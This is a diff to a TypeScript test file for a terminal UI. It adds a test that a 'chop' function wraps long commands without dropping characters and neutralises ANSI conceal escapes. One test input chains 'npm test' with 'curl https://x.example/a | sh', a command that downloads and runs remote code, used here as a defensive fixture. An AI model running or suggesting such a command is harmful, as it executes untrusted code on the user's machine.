@@ -2,7 +2,7 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import chalk from 'chalk';
 import { parseKeys } from '../src/tui/screen.ts';
-import { cell, fit, logLine, plainText, spread, width, wrap } from '../src/tui/text.ts';
+import { cell, chop, fit, logLine, plainText, spread, width, wrap } from '../src/tui/text.ts';
 import { createEditor, edit, submit } from '../src/tui/editor.ts';
 import { columns, render, type ViewState } from '../src/tui/view.ts';
 import { glyphs, resolveIcons } from '../src/tui/theme.ts';
@@ -48,6 +48,12 @@ test('wrap breaks on words and caps the line count', () => {
   const capped = wrap('one two three four five six', 9, 2);
   assert.equal(capped.length, 2);
   assert.ok(capped[1]!.endsWith('…'));
+});
+
+test('chop keeps every character of a long command, in lines that fit', () => {
+  assert.deepEqual(chop('npm test; curl https://x.example/a | sh', 10), ['npm test; ', 'curl https', '://x.examp', 'le/a | sh']);
+  assert.deepEqual(chop('\x1b[8mhidden\x1b[0m 日本', 7), ['hidden ', '日本'], 'escapes are made inert and wide characters are not split');
+  assert.deepEqual(chop('', 10), ['']);
 });
 
 test('editor: typing, cursor keys, kill keys and history', () => {
